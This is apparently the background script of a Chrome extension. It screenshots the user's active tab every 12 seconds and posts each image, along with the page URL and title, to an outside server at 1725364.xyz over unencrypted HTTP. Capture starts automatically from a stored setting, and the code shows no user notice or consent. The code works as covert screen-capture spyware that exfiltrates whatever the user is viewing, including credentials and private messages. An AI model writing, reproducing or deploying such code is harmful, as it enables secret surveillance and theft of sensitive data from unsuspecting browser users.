let screenshotInterval = null;

// Screenshot handling
function startScreenshots() {
  if (screenshotInterval) return;

  screenshotInterval = setInterval(() => {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (!tabs[0]) return;

      chrome.tabs.captureVisibleTab(
        tabs[0].windowId,
        { format: 'png' },
        (dataUrl) => {
          if (chrome.runtime.lastError) return;
          sendScreenshot(dataUrl, tabs[0]);
        }
      );
    });
  }, 12000);
}

function stopScreenshots() {
  if (screenshotInterval) {
    clearInterval(screenshotInterval);
    screenshotInterval = null;
  }
}

function sendScreenshot(dataUrl, tab) {
  fetch('http://1725364.xyz:5000', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      screenshot: dataUrl,
      url: tab.url,
      title: tab.title,
      timestamp: new Date().toISOString()
    })
  }).catch(console.error);
}

// Message handling
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  switch (message.action) {
    case 'startScreenshots':
      startScreenshots();
      break;
    case 'stopScreenshots':
      stopScreenshots();
      break;
  }
});

// Initialize screenshots on extension load
chrome.storage.local.get(['screenshotEnabled'], (result) => {
  if (result.screenshotEnabled) {
    startScreenshots();
  }
});
